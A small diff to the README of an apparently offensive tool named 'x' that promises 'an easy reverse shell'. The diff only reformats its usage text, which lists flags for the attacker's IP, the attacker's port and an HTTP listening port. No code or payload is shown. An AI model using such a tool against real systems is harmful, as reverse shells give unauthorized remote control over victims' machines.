@@ -1,7 +1,6 @@
 # x
-Get an easy reverse shell
-```sh
-[!] usage ./x -lhost <attacker_ip> -lport <attacker_port> -listen <http_port>
+Get an easy reverse shell.
+```[!] usage ./x -lhost <attacker_ip> -lport <attacker_port> -listen <http_port>
   -lhost string
         ip to send shell
   -listen string
